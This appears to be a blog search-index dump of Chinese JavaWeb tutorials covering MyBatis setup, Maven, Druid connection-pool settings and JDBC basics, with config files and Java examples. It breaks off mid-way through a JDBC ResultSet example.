三层架构：表现层、业务层、持久层\n三层架构在后期会给大家进行讲解，今天先简单的了解下即可。\n\n\n框架：\n\n框架就是一个半成品软件，是一套可重用的、通用的、软件基础代码模型\n在框架的基础之上构建软件编写更加高效、规范、通用、可扩展\n\n举例给大家简单的解释一下什么是半成品软件。大家小时候应该在公园见过给石膏娃娃涂鸦\n\n如下图所示有一个石膏娃娃，这个就是一个半成品。你可以在这个半成品的基础上进行不同颜色的涂鸦\n\n了解了什么是 Mybatis 后，接下来说说以前  JDBC代码  的缺点以及 Mybatis 又是如何解决的。\n# 1.2  JDBC 缺点\n下面是 JDBC 代码，我们通过该代码分析都存在什么缺点：\n\n\n\n硬编码\n\n\n注册驱动、获取连接\n上图标 1 的代码有很多字符串，而这些是连接数据库的四个基本信息，以后如果要将 Mysql 数据库换成其他的关系型数据库的话，这四个地方都需要修改，如果放在此处就意味着要修改我们的源代码。\n\n\nSQL 语句\n上图标 2 的代码。如果表结构发生变化，SQL 语句就要进行更改。这也不方便后期的维护。\n\n\n\n\n操作繁琐\n\n\n手动设置参数\n\n\n手动封装结果集\n上图标 4 的代码是对查询到的数据进行封装，而这部分代码是没有什么技术含量，而且特别耗费时间的。\n\n\n\n\n# 1.3  Mybatis 优化\n\n硬编码可以配置到配置文件\n操作繁琐的地方 mybatis 都自动完成\n\n如图所示\n\n下图是持久层框架的使用占比。\n\n# 2、Mybatis 快速入门\n# 2.1 步骤\n\n创建 User 表，添加数据\n创建模块，导入坐标\n编写 mybatis 核心配置文件 -&gt; 替换连接信息，解决硬编码问题\n编写 SQL 映射文件 -&gt; 统一管理 SQL 语句，解决硬编码问题\n编码\n\n定义 pojo 类\n加载核心配置文件，获取 SQLSessionFactory 对象\n获取 SQLSession 对象，执行 SQL 语句\n释放资源\n\n\n\n# 2.2 详细操作\n\n在 pom.xml 中导入相关依赖，logback 和 slf4j 都是用来查看日志的，直接复制\n\n&lt;dependencies>\n    &lt;dependency>\n        &lt;groupId>org.mybatis&lt;/groupId>\n        &lt;artifactId>mybatis&lt;/artifactId>\n        &lt;version>3.5.5&lt;/version>\n    &lt;/dependency>\n\n    &lt;dependency>\n        &lt;groupId>mysql&lt;/groupId>\n        &lt;artifactId>mysql-connector-java&lt;/artifactId>\n        &lt;version>5.1.46&lt;/version>\n    &lt;/dependency>\n\n    &lt;dependency>\n        &lt;groupId>junit&lt;/groupId>\n        &lt;artifactId>junit&lt;/artifactId>\n        &lt;version>4.13&lt;/version>\n        &lt;scope>test&lt;/scope>\n    &lt;/dependency>\n\n    &lt;!-- 添加slf4j日志api -->\n    &lt;dependency>\n        &lt;groupId>org.slf4j&lt;/groupId>\n        &lt;artifactId>slf4j-api&lt;/artifactId>\n        &lt;version>1.7.20&lt;/version>\n    &lt;/dependency>\n    &lt;!-- 添加logback-classic依赖 -->\n    &lt;dependency>\n        &lt;groupId>ch.qos.logback&lt;/groupId>\n        &lt;artifactId>logback-classic&lt;/artifactId>\n        &lt;version>1.2.3&lt;/version>\n    &lt;/dependency>\n    &lt;!-- 添加logback-core依赖 -->\n    &lt;dependency>\n        &lt;groupId>ch.qos.logback&lt;/groupId>\n        &lt;artifactId>logback-core&lt;/artifactId>\n        &lt;version>1.2.3&lt;/version>\n    &lt;/dependency>\n&lt;/dependencies>\n\n在 main 的 resources 下创建 logback.xml，内容如下\n\n&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?>\n&lt;configuration>\n    &lt;!--\n        CONSOLE ：表示当前的日志信息是可以输出到控制台的。\n    -->\n    &lt;appender name=\"Console\" class=\"ch.qos.logback.core.ConsoleAppender\">\n        &lt;encoder>\n            &lt;pattern>[%level] %blue(%d&#123;HH:mm:ss.SSS&#125;) %cyan([%thread]) %boldGreen(%logger&#123;15&#125;) - %msg %n&lt;/pattern>\n        &lt;/encoder>\n    &lt;/appender>\n\n    &lt;logger name=\"com.itheima\" level=\"DEBUG\" additivity=\"false\">\n        &lt;appender-ref ref=\"Console\"/>\n    &lt;/logger>\n\n\n    &lt;!--\n\n      level:用来设置打印级别，大小写无关：TRACE, DEBUG, INFO, WARN, ERROR, ALL 和 OFF\n     ， 默认debug\n      &lt;root>可以包含零个或多个&lt;appender-ref>元素，标识这个输出位置将会被本日志级别控制。\n      -->\n    &lt;root level=\"DEBUG\">\n        &lt;appender-ref ref=\"Console\"/>\n    &lt;/root>\n&lt;/configuration>\n\n在 main 的 resources 下创建 mybatis-config.xml，内容如下\n\n&lt;?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n&lt;!DOCTYPE configuration\n        PUBLIC \"-//mybatis.org//DTD Config 3.0//EN\"\n        \"http://mybatis.org/dtd/mybatis-3-config.dtd\">\n&lt;configuration>\n    &lt;environments default=\"development\">\n        &lt;environment id=\"development\">\n            &lt;transactionManager type=\"JDBC\"/>\n            &lt;dataSource type=\"POOLED\">\n&lt;!--                数据库配置，自行修改-->\n                &lt;property name=\"driver\" value=\"com.mysql.jdbc.Driver\"/>\n                &lt;property name=\"url\" value=\"jdbc:mysql:///mybatis?useSSL=false\"/>\n                &lt;property name=\"username\" value=\"root\"/>\n                &lt;property name=\"password\" value=\"root\"/>\n            &lt;/dataSource>\n        &lt;/environment>\n    &lt;/environments>\n    &lt;mappers>\n        &lt;mapper resource=\"UserMapper.xml\"/>\n    &lt;/mappers>\n&lt;/configuration>\n\n在 main 的 resources 下创建 UserMapper.xml，Mapper 为映射文件，命名规则为表名 Mapper.xml，namespace 为名称空间，id 为唯一标识 sql 语句的符号，在执行 SQL 语句时需要使用；resultType 为查询结果要放的类\n\n&lt;?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n&lt;!DOCTYPE mapper\n        PUBLIC \"-//mybatis.org//DTD Mapper 3.0//EN\"\n        \"http://mybatis.org/dtd/mybatis-3-mapper.dtd\">\n&lt;!--\n    namespace：标签空间\n\n-->\n&lt;mapper namespace=\"test\">\n    &lt;select id=\"selectAll\" resultType=\"com.itheima.pojo.User\">\n        select * from tb_user;\n    &lt;/select>\n&lt;/mapper>\n\n测试编码\n\npackage com.itheima;\n\nimport com.itheima.pojo.User;\nimport org.apache.ibatis.io.Resources;\nimport org.apache.ibatis.session.SqlSession;\nimport org.apache.ibatis.session.SqlSessionFactory;\nimport org.apache.ibatis.session.SqlSessionFactoryBuilder;\n\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.util.List;\n\npublic class MybatisDemo &#123;\n    public static void main(String[] args) throws IOException &#123;\n        //1.加载mybatis核心配置文件，获取sqlSessionFactory，这一段直接复制官网\n        //配置文件工作路径直接在resources下找\n        String resource = \"mybatis-config.xml\";\n        InputStream inputStream = Resources.getResourceAsStream(resource);\n        SqlSessionFactory sqlSessionFactory = new SqlSessionFactoryBuilder().build(inputStream);\n\n        //2.获取SQLSession对象来执行SQL语句\n        SqlSession sqlSession = sqlSessionFactory.openSession();\n\n        //3.执行SQL语句\n        List&lt;User> users = sqlSession.selectList(\"test.selectAll\");\n\n        System.out.println(users);\n\n        //4.释放资源\n        sqlSession.close();\n    &#125;\n&#125;\n# 3、Mapper 代理开发\n\n目的：\n\n解决原生方式中的硬编码\n简化后期 SQL 执行\n\n\n\n\n\n\n\n\n\n\n\n\n\nUserMapper：接口，里面会有很多方法，会和配置文件里的 id 名称一一对应\n# 3.1 使用 Mapper 代理开发完成入门案例\n\n定义与 SQL 映射文件同名的 Mapper 接口，并且将 Mapper 接口和 SQL 映射文件放置在同一目录下\n\n注意：maven 要求配置文件和 java 代码分开。因此不要将配置文件直接拖到代码目录，可以在 resources 目录下建立与 Mapper 接口同级别同名的目录树\n\n\n设置 SQL 映射文件的 namespace 属性为 Mapper 接口全限定名\n在 Mapper 接口中定义方法，方法名就是 SQL 映射文件中 SQL 语句的 id，并保持参数类型和返回值一致\n编码\n\n通过 SQLSession 的 getMapper 获取 Mapper 接口的代理对象\n调用对应方法完成 SQL\n\n\n\n\n\n目录树结构：\n\n\n\n映射的名称空间为接口的全限定名\n\n\n\n定义方法，方法名是映射文件 SQL 的 id，没有参数，返回值是一个 User 的集合，由于配置文件路径改了，要在 mybatis-config.xml 中更改 mapper resources 的路径\n\n\n\n4、编码\npackage com.itheima;\n\nimport com.itheima.mapper.UserMapper;\nimport com.itheima.pojo.User;\nimport org.apache.ibatis.io.Resources;\nimport org.apache.ibatis.session.SqlSession;\nimport org.apache.ibatis.session.SqlSessionFactory;\nimport org.apache.ibatis.session.SqlSessionFactoryBuilder;\n\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.util.List;\n\n/**\n * mybatis代理开发\n */\npublic class MybatisDemo2 &#123;\n    public static void main(String[] args) throws IOException &#123;\n        //1.加载mybatis核心配置文件，获取sqlSessionFactory\n        String resource = \"mybatis-config.xml\";\n        InputStream inputStream = Resources.getResourceAsStream(resource);\n        SqlSessionFactory sqlSessionFactory = new SqlSessionFactoryBuilder().build(inputStream);\n\n        //2.获取SQLSession对象来执行SQL语句\n        SqlSession sqlSession = sqlSessionFactory.openSession();\n\n        //3.获取UserMapper接口的代理对象\n        UserMapper userMapper = sqlSession.getMapper(UserMapper.class);\n        List&lt;User> users = userMapper.selectAll();\n        System.out.println(users);\n\n        //4.释放资源\n        sqlSession.close();\n    &#125;\n&#125;\n# 4、Mybatis 核心配置文件\n\n\n核心配置文件：mybatis-config.xml\n\n\nenvironments：环境，里面有 environment，可以配置多个不同的数据库，通过改变 default 来改变数据源\n\n\n&lt;!--    配置数据库连接环境信息，可以配置多个environment，通过对应的default属性来切换数据库-->\n    &lt;environments default=\"development\">\n        &lt;environment id=\"development\">\n            &lt;transactionManager type=\"JDBC\"/>\n            &lt;dataSource type=\"POOLED\">\n&lt;!--                数据库配置-->\n                &lt;property name=\"driver\" value=\"com.mysql.jdbc.Driver\"/>\n                &lt;property name=\"url\" value=\"jdbc:mysql:///mybatis?useSSL=false\"/>\n                &lt;property name=\"username\" value=\"root\"/>\n                &lt;property name=\"password\" value=\"root\"/>\n            &lt;/dataSource>\n        &lt;/environment>\n    &lt;/environments>\n\ntypeAliases：别名，作用：将包目录下的类起一个别名，这样在 mapper 中就不需要写类的全名了，且不区分大小写\n\n&lt;typeAliases&gt;\n\t&lt;package name&#x3D;&quot;com.itheima.pojo&#x2F;&quot;&gt;\n&lt;&#x2F;typeAliases&gt;\n\n\n配置别名时要遵守标签顺序\n\n# 5、配置文件完成增删改查\n\n\n要完成的功能列表清单\n\n查询\n\n查询所有数据\n查看详情\n条件查询\n\n\n添加\n修改\n\n修改全部字段\n修改动态字段\n\n\n删除\n\n删除一个\n批量删除\n\n\n\n\n\n准备环境\n\n数据库表 tb_brand\n实体类 Brand\n测试用例\n安装 MyBatisX 插件\n\n\n\n-- 删除tb_brand表\ndrop table if exists tb_brand;\n-- 创建tb_brand表\ncreate table tb_brand\n(\n    -- id 主键\n    id           int primary key auto_increment,\n    -- 品牌名称\n    brand_name   varchar(20),\n    -- 企业名称\n    company_name varchar(20),\n    -- 排序字段\n    ordered      int,\n    -- 描述信息\n    description  varchar(100),\n    -- 状态：0：禁用  1：启用\n    status       int\n);\n-- 添加数据\ninsert into tb_brand (brand_name, company_name, ordered, description, status)\nvalues ('三只松鼠', '三只松鼠股份有限公司', 5, '好吃不上火', 0),\n       ('华为', '华为技术有限公司', 100, '华为致力于把数字世界带入每个人、每个家庭、每个组织，构建万物互联的智能世界', 1),\n       ('小米', '小米科技有限公司', 50, 'are you ok', 1);\n\n\nSELECT * FROM tb_brand;\n# 5.1 查询所有数据\n\n编写接口方法：Mapper 接口\n\n参数：无\n结果：List&lt;Brand&gt;\n\n\n编写 SQL 语句：SQL 映射文件\n执行方法，测试\n\n\n\n核心内容：SQL 语句怎么写，参数要什么，结果怎么处理\n\n\n碰到的问题：数据库表的字段名称和实体类的属性名称不一样，则不能自动封装数据\n\n\n解决方法:\n\n\n起别名，对不一样的列明起别名，让列名和属性名一样\n\n\n定义 SQL 片段\n&lt;sql id=\"brand_column\">\n    id,brand_name as brandName,company_name as companyName,ordered,description,status\n&lt;/sql>\n&lt;select id=\"selectAll\" resultType=\"brand\">\n    select\n        &lt;include refid=\"brand_column\"/>\n    from tb_brand;\n&lt;/select>\n\n\nresultMap\n\nid：唯一标识\ntype：映射的类型，支持别名\n字标签：id：完成主键字段的映射\n字标签：result：完成一般字段的映射\n属性：column（列名），property（实体类的属性名）\n\n&lt;resultMap id=\"brandResultMap\" type=\"brand\">\n    &lt;result column=\"brand_name\" property=\"brandName\" />\n    &lt;result column=\"company_name\" property=\"companyName\" />\n&lt;/resultMap>\n    &lt;select id=\"selectAll\" resultMap=\"brandResultMap\">\n        select\n            *\n        from tb_brand;\n    &lt;/select>\n\n\n\n\n\n\n# 5.2 查询 - 查看详情\n\n参数占位符：\n\n#{}：使用预编译，将其替换为？，为防止 SQL 注入\n${}：直接拼接参数，会存在 SQL 注入问题\n\n\n使用时机：\n\n传递参数的时候：#{}\n表名或者列名不固定的情况下：${}，但是只要用 $ 就会存在注入问题\n\n\n特殊字符处理\n\n转义字符：xml 转义字符\nCDATA 区：CD 补全\n\n\n\n","slug":"JavaWeb-MyBatis","date":"2022-06-23T13:38:28.000Z","categories_index":"JavaWeb","tags_index":"JavaWeb","author_index":"cCor4ng3"},{"id":"de916a02e234c53ab1fc7473c41a0ed5","title":"JavaWeb-Maven","content":"# 1、Maven 概述\n\nMaven 是专门用于管理和构建 Java 项目的工具，它的主要功能有：\n\n提供了一套标准化的项目结构\n提供了一套标准化的构建流程（编译、测试、打包、发布）\n提供了一套依赖管理机制\n\n\n标准化项目结构：\n\n\n\n标准化构建流程：\n\n\n\n提供了一套依赖管理机制\n\n\n\n\n\n\n\n\n\n\n\n\nMaven 简介\nMaven 安装配置\nMaven 基本使用\nIDEA 配置 Maven\n依赖管理\n\n# 2、Maven 简介\n\nApache Maven 是一个项目管理和构建工具，它基于项目对象模型（POM）的概念，通过一小段描述信息来管理项目的构建、报告和文档\n官网：http://maven.apache.org/\n\n\n\n\n\n\n\n\n\n\n\n项目对象模型 (Project Object Model)\n依赖管理模型 (Dependency)\n插件 (Plugin)\n\n\n\n仓库分类\n\n本地仓库：自己计算机上的目录\n中央仓库：由 Maven 团队维护的全球唯一的仓库\n\n地址：https://repo1.maven.org/maven2/\n\n\n远程仓库：一般由公司团队搭建的私有仓库\n\n\n写了一个依赖后 Maven 会先到本地仓库找，本地仓库如果没有会去中央仓库找，中央仓库找到之后会将这个依赖 jar 包下载到本地仓库，如果架设了私服，会先到私服找，私服再找不到然后去中央仓库找\n\n# 3、Maven 安装与配置\n\n解压 apache-maven 即为安装完成\n配置环境变量 MAVEN-HOME 为安装路径的 bin 目录\n配置本地仓库：修改 conf/settings.xml 中的 &lt;localRepository&gt; 为一个指定目录\n配置阿里云私服：修改 conf/settings.xml 中的 &lt;mirrors&gt; 标签，为其添加如下子标签\n\n&lt;mirror&gt;\n\t&lt;id&gt;alimaven&lt;&#x2F;id&gt;\n\t&lt;name&gt;aliyun maven&lt;&#x2F;name&gt;\n\t&lt;url&gt;http:&#x2F;&#x2F;maven.aliyun.com&#x2F;nexus&#x2F;content&#x2F;groups&#x2F;public&#x2F;&lt;&#x2F;url&gt;\n\t&lt;mirrorOf&gt;central&lt;&#x2F;mirrorOf&gt;\n&lt;&#x2F;mirror&gt;\n# 4、Maven 的基本使用\n# 4.1 Maven 常用命令\n\n\ncompile：编译\n\n\nclean：清理\n\n\ntest：测试\n\n\npackage：打包\n\n\ninstall：安装\n\n\n# 4.2 Maven 生命周期\n\nMaven 构建项目生命周期描述的是一次构建过程经历了多少事件\nMaven 对项目构建的生命周期划分为 3 套\n\nclean：清理工作\ndefault：核心工作，例如编译、测试、打包、安装等\nsite：产生报告，发布站点等\n\n\n\n\n\n# 5、IDEA 配置 Maven\n# 5.1 IDEA 配置 Maven 环境\n我们需要先在 IDEA 中配置 Maven 环境：\n\n\n选择 IDEA 中 File --&gt; Settings\n\n\n\n搜索 maven\n\n\n\n设置 IDEA 使用本地安装的 Maven，并修改配置文件路径\n\n\n\n# 5.2 Maven 坐标详解\n什么是坐标？\n\nMaven 中的坐标是资源的唯一标识\n使用坐标来定义项目或引入项目中需要的依赖\n\nMaven 坐标主要组成\n\ngroupId：定义当前 Maven 项目隶属组织名称（通常是域名反写，例如：com.itheima）\nartifactId：定义当前 Maven 项目名称（通常是模块名称，例如 order-service、goods-service）\nversion：定义当前项目版本号\n\n如下图就是使用坐标表示一个项目：\n\n\n\n\n\n\n\n\n\n\n注意：\n\n上面所说的资源可以是插件、依赖、当前项目。\n我们的项目如果被其他的项目依赖时，也是需要坐标来引入的。\n\n# 5.3 创建 Maven 项目\nFile-&gt;Project Structure-&gt;Modules-&gt;±&gt;New module\n\n# 5.4 导入 Maven 项目\n大家在学习时可能需要看老师的代码，当然也就需要将老师的代码导入到自己的 IDEA 中。我们可以通过以下步骤进行项目的导入：\n\n\n选择右侧 Maven 面板，点击 + 号\n\n\n\n选中对应项目的 pom.xml 文件，双击即可\n\n\n\n配置 Maven-Helper 插件\n\n\n选择 IDEA 中 File --&gt; Settings\n\n\n\n选择 Plugins\n\n\n\n搜索 Maven，选择第一个 Maven Helper，点击 Install 安装，弹出面板中点击 Accept\n\n\n\n重启 IDEA\n\n\n安装完该插件后可以通过 选中项目右键进行相关命令操作，如下图所示：\n\n# 6、依赖管理\n# 6.1  使用坐标引入 jar 包\n使用坐标引入 jar 包的步骤：\n\n\n在项目的 pom.xml 中编写  标签\n\n\n在  标签中 使用  引入坐标\n\n\n定义坐标的 groupId，artifactId，version\n\n\n\n点击刷新按钮，使坐标生效\n\n\n\n\n\n\n\n\n\n\n\n\n注意：\n\n具体的坐标我们可以到如下网站进行搜索\nhttps://mvnrepository.com/\n\n快捷方式导入 jar 包的坐标：\n每次需要引入 jar 包，都去对应的网站进行搜索是比较麻烦的，接下来给大家介绍一种快捷引入坐标的方式\n\n\n在 pom.xml 中 按 alt + insert，选择 Dependency\n\n\n\n在弹出的面板中搜索对应坐标，然后双击选中对应坐标\n\n\n\n点击刷新按钮，使坐标生效\n\n\n\n自动导入设置：\n上面每次操作都需要点击刷新按钮，让引入的坐标生效。当然我们也可以通过设置让其自动完成\n\n\n选择 IDEA 中 File --&gt; Settings\n\n\n\n在弹出的面板中找到 Build Tools\n\n\n\n选择 Any changes，点击 ok 即可生效\n\n\n# 6.2  依赖范围\n通过设置坐标的依赖范围 (scope)，可以设置 对应 jar 包的作用范围：编译环境、测试环境、运行环境。\n如下图所示给  junit  依赖通过  scope  标签指定依赖的作用范围。 那么这个依赖就只能作用在测试环境，其他环境下不能使用。\n\n那么  scope  都可以有哪些取值呢？\n\n\n\n依赖范围\n编译 classpath\n测试 classpath\n运行 classpath\n例子\n\n\n\n\ncompile\nY\nY\nY\nlogback\n\n\ntest\n-\nY\n-\nJunit\n\n\nprovided\nY\nY\n-\nservlet-api\n\n\nruntime\n-\nY\nY\njdbc 驱动\n\n\nsystem\nY\nY\n-\n存储在本地的 jar 包\n\n\n\n\ncompile ：作用于编译环境、测试环境、运行环境。\ntest ： 作用于测试环境。典型的就是 Junit 坐标，以后使用 Junit 时，都会将 scope 指定为该值\nprovided ：作用于编译环境、测试环境。我们后面会学习  servlet-api  ，在使用它时，必须将  scope  设置为该值，不然运行时就会报错\nruntime  ： 作用于测试环境、运行环境。jdbc 驱动一般将  scope  设置为该值，当然不设置也没有任何问题\n\n\n\n\n\n\n\n\n\n\n注意：\n\n如果引入坐标不指定  scope  标签时，默认就是 compile  值。以后大部分 jar 包都是使用默认值。\n\n","slug":"JavaWeb-Maven","date":"2022-06-23T13:37:21.000Z","categories_index":"JavaWeb","tags_index":"JavaWeb","author_index":"cCor4ng3"},{"id":"647a0ca593f8753976e4c6270337edb2","title":"druid配置详解","content":"# druid 配置详解\n\n\n\n属性\n说明\n建议值\n\n\n\n\nurl\n数据库的 jdbc 连接地址。一般为连接 oracle/mysql。示例如下：\n\n\n\n\nmysql : jdbc:mysql://ip:port/dbname?option1&amp;option2&amp;…\n\n\n\n\noracle : jdbc:oracle:thin:@ip:port:oracle_sid\n\n\n\n\n\n\n\n\nusername\n登录数据库的用户名\n\n\n\npassword\n登录数据库的用户密码\n\n\n\ninitialSize\n启动程序时，在连接池中初始化多少个连接\n10-50 已足够\n\n\nmaxActive\n连接池中最多支持多少个活动会话\n\n\n\nmaxWait\n程序向连接池中请求连接时，超过 maxWait 的值后，认为本次请求失败，即连接池\n100\n\n\n\n没有可用连接，单位毫秒，设置 - 1 时表示无限等待\n\n\n\nminEvictableIdleTimeMillis\n池中某个连接的空闲时长达到 N 毫秒后，连接池在下次检查空闲连接时，将\n见说明部分\n\n\n\n回收该连接，要小于防火墙超时设置\n\n\n\n\nnet.netfilter.nf_conntrack_tcp_timeout_established 的设置\n\n\n\ntimeBetweenEvictionRunsMillis\n检查空闲连接的频率，单位毫秒，非正整数时表示不进行检查\n\n\n\nkeepAlive\n程序没有 close 连接且空闲时长超过 minEvictableIdleTimeMillis, 则会执\ntrue\n\n\n\n行 validationQuery 指定的 SQL, 以保证该程序连接不会池 kill 掉，其范围不超\n\n\n\n\n过 minIdle 指定的连接个数。\n\n\n\nminIdle\n回收空闲连接时，将保证至少有 minIdle 个连接.\n与 initialSize 相同\n\n\nremoveAbandoned\n要求程序从池中 get 到连接后，N 秒后必须 close, 否则 druid 会强制回收该\nfalse, 当发现程序有未\n\n\n\n连接，不管该连接中是活动还是空闲，以防止进程不会进行 close 而霸占连接。\n正常 close 连接时设置为 true\n\n\nremoveAbandonedTimeout\n设置 druid 强制回收连接的时限，当程序从池中 get 到连接开始算起，超过此\n应大于业务运行最长时间\n\n\n\n值后，druid 将强制回收该连接，单位秒。\n\n\n\nlogAbandoned\n当 druid 强制回收连接后，是否将 stack trace 记录到日志中\ntrue\n\n\ntestWhileIdle\n当程序请求连接，池在分配连接时，是否先检查该连接是否有效。(高效)\ntrue\n\n\nvalidationQuery\n检查池中的连接是否仍可用的 SQL 语句，drui 会连接到数据库执行该 SQL, 如果\n\n\n\n\n正常返回，则表示连接可用，否则表示连接不可用\n\n\n\ntestOnBorrow\n程序 申请 连接时，进行连接有效性检查（低效，影响性能）\nfalse\n\n\ntestOnReturn\n程序 返还 连接时，进行连接有效性检查（低效，影响性能）\nfalse\n\n\npoolPreparedStatements\n缓存通过以下两个方法发起的 SQL:\ntrue\n\n\n\npublic PreparedStatement prepareStatement(String sql)\n\n\n\n\npublic PreparedStatement prepareStatement(String sql,\n\n\n\n\nint resultSetType, int resultSetConcurrency)\n\n\n\nmaxPoolPrepareStatementPerConnectionSize\n每个连接最多缓存多少个 SQL\n20\n\n\nfilters\n这里配置的是插件，常用的插件有:\nstat,wall,slf4j\n\n\n\n监控统计: filter:stat\n\n\n\n\n日志监控: filter:log4j 或者 slf4j\n\n\n\n\n防御 SQL 注入: filter:wall\n\n\n\nconnectProperties\n连接属性。比如设置一些连接池统计方面的配置。\n\n\n\n\ndruid.stat.mergeSql=true;druid.stat.slowSqlMillis=5000\n\n\n\n\n比如设置一些数据库连接属性:\n\n\n\n\n\n\n\n\n\n# 配置示例\ndriverClassName&#x3D;com.mysql.jdbc.Driver\nurl&#x3D;jdbc:mysql:&#x2F;&#x2F;&#x2F;db3?useSSL&#x3D;false&amp;useServerPrepStmts&#x3D;true\nusername&#x3D;root\npassword&#x3D;root\n#初始化连接数量\ninitialSize&#x3D;5\n#最大连接数\nmaxActive&#x3D;10\n#最大等待时间\nmaxWait&#x3D;3000\n","slug":"druid配置详解","date":"2022-06-22T12:57:50.000Z","categories_index":"JavaWeb","tags_index":"JavaWeb","author_index":"cCor4ng3"},{"id":"4892e4a27a2575ab7f5b307cf40eb42d","title":"JavaWeb-JDBC","content":"# 1、JDBC 简介\n\n\nJDBC 概念\n\nJDBC 就是使用 Java 语言操作关系型数据库的一套 API\n全称：（Java DataBase Connectivity）Java 数据库连接\n\n\n\nJDBC 本质：\n\n官方（Sun 公司）定义的一套操作所有关系型数据库的规则，即接口\n各个数据库厂商去实现这套接口，提供数据库驱动 jar 包\n我们可以使用这套接口（JDBC）编程，真正执行的代码是驱动 jar 包中的实现类\n\n\n\nJDBC 好处：\n\n各数据库厂商使用相同的接口，Java 代码不需要针推不同数据库分别开发\n可随时替换底层数据库，访问数据库的 Java 代码基本不变\n\n\n\n# 2、JDBC 快速入门\n# 2.1 步骤\n\n\n创建工程，导入驱动 jar 包\n\n\n注册驱动\n\n\n获取连接\n\n\n定义 SQL 语句\n\n\n获取执行 SQL 对象\n\n\n执行 SQL\n\n\n处理返回结果\n\n\n释放资源\n\n\npackage com.itheima.jdbc;\n\nimport java.sql.Connection;\nimport java.sql.DriverManager;\nimport java.sql.Statement;\n\n/**\n * 快速入门\n */\npublic class JDBCDemo &#123;\n    public static void main(String[] args) throws Exception &#123;\n        //1. 注册驱动\n        Class.forName(\"com.mysql.jdbc.Driver\");\n\n        //2. 获取连接\n        String url = \"jdbc:mysql://127.0.0.1:3306/db3\";\n        String username = \"root\";\n        String password = \"root\";\n        Connection conn = DriverManager.getConnection(url, username, password);\n\n        //3. 定义SQL语句\n        String sql = \"UPDATE ACCOUNT SET MONEY = 2000 WHERE ID = 1\";\n\n        //4. 获取执行SQL的对象 statement\n        Statement stmt = conn.createStatement();\n        \n\n        //5. 执行sql\n        int count = stmt.executeUpdate(sql);\n        //返回受影响的行数\n\n        //6. 处理结果\n        System.out.println(count);\n\n        //7. 释放资源\n        stmt.close();\n        conn.close();\n    &#125;\n&#125;\n\n# 3、JDBC API 详解\n\nDriverManager\nConnection\nStatement\nResultSet\nPreparedStatement\n\n# 3.1 DriverManager\n\nDriverManager（驱动管理类）作用：\n\n注册驱动\n获取数据库连接\n\n\nDriverManager 是一个工具类，里面都是静态方法\n\n\n\n\n描述\n方法名\n\n\n\n\nstatic Connection\ngetConnection(Stirng url, String user, String password)\n\n\n\n参数：\n\nURL：连接路径\n\n\n\n\n\n\n\n\n\n\n语法：jdbc:mysq://ip 地址 (域名): 端口号 / 数据库名称？参数键值对 1 &amp; 参数键值对 2\n示例：jdbc:mysql://127.0.0.1:3306/db1\n细节：\n\n如果连接的是本机 mysql 服务器，并且 mysql 服务默认端口号是 3306，则 url 可以简写为 jdbc:mysql/// 数据库名称？参数键值对\n配置 useSSL=false 参数，禁用安全连接方式，解决警告提示:jdbc:mysql///db2?useSSL=false\n\n\nuser：用户名\npassword：密码\n\n# 3.2 Connection\n\n\nConnection (数据库连接对象) 作用：\n\n\n获取执行 SQL 的对象\n\n普通执行 SQL 对象 Statement create Statement()\n预编译 SQL 的执行 SQL 对象：防止 SQL 注入： PreparedStatement preparedStatement(sql)\n执行存储过程的对象： CallableStatement prepareCall(sql)\n\n\n\n管理事务\n\n\nMySQL 事务管理\n\n\n\n\n\n\n\n\n\n开启事务：BEGIN;/START TRANSACTION;\n提交事务：COMMIT;\n回滚事务：ROLLBACK;\nMYSQL 默认自动提交事务\n\n\nJDBC 事务管理：Connection 接口中定义了 3 个对应方法\n\n\n\n\n\n\n\n\n\n开启事务：setAutoCommit (boolean autoCommit)：true 为自动提交事务，false 为手动提交事务\n提交事务：commit ()\n回滚事务：rollback ()\ntry &#123;\n    //开启事务\n    conn.setAutoCommit(false);\n    //执行sql1，并处理结果\n    int count1 = stmt.executeUpdate(sql1);\n    System.out.println(count1);\n       \n    //执行sql2，并处理结果\n    int count2 = stmt.executeUpdate(sql2);\n    System.out.println(count2);\n&#125; catch (Exception e) &#123;\n    //回滚事务\n    conn.rollback();\n    throw new RuntimeException(e);\n&#125;\n//提交事务\nconn.commit();\n\n\n\n\n\n\n# 3.3 Statement\n\nStatement 作用：\n\n执行 SQL 语句\n\n\n执行 SQL 语句：\n\n\n\n\n\n\n\n\n\n\nint executeUpdate (sql) 执行 DML，DDL 语句\n\n返回值：(1) DML 语句影响的行数\t(2) DDL 语句执行后，执行成功也可能返回 0（DDL 不报异常一般就是成功）\nResultSet executeQuery (sql) 执行 DQL 语句\n\n\n\n\n\n\n\n\n\n返回值：ResultSet 结果集对象\n\n# 3.4 ResultSet\n\n\nResultSet (结果集对象) 作用：\n\n\n封装了 DQL 查询语句的结果\n\n\n\n\n\n\n\n\n\nResultSet stmt.executeQuery (sql): 执行 SQL 语句，返回 ResultSet 对象\n\n\n\n\n获取查询结果\n\n\n\n\n\n\n\n\n\n\n\nboolean next ():(1) 将光标从当前位置移动向下一行\t(2) 判断当前行是否为有效行\n\n返回值：\n\ntrue：有效行，当前行有数据\nfalse：无效行，当前行没有数据\n\nxxx getXxx (参数)：获取数据\n\n\n\n\n\n\n\n\n\nxxx：参数类型，如 int getint (参数); String getString (参数)\n参数：\n\nint：列的编号，从 1 开始\nString：列的名称\n\n\n\n使用步骤\n\n游标向下移动一行，并判断该行是否有数据：next ()\n获取数据：getXxx (参数)\n\n\n\n//循环判断游标是否为最后一行末尾\nwhile (rs.next())&#123;\n    //获取数据\n    rs.getXxx(参数);\n&#125;\npackage com.itheima.jdbc;\n\nimport org.junit.Test;\n\nimport java.sql.Connection;\nimport java.sql.DriverManager;\nimport java.sql.ResultSet;\nimport java.sql.Statement;\n\npublic class JDBCDemo5_ResultSet &#123;\n    /**\n     * ResultSet\n     * @throws Exception\n     */\n    @Test\n    public void testResultSet() throws Exception &#123;\n        Class.forName(\"com.mysql.jdbc.Driver\");\n        String url = \"jdbc:mysql://127.0.0.1:3306/db3?useSSL=false\";\n        String username = \"root\";\n        String password = \"root\";\n        Connection conn = DriverManager.getConnection(url, username, password);\n\n        Statement statement = conn.createStatement();\n        String sql = \"SELECT * FROM ACCOUNT\";\n\n        ResultSet resultSet = statement.executeQuery(sql);\n        //处理结果\n        //光标向下移动一行，并且判断当前行是否有数据\n        while (resultSet.next()) &#123;\n            //获取数据\n            int anInt 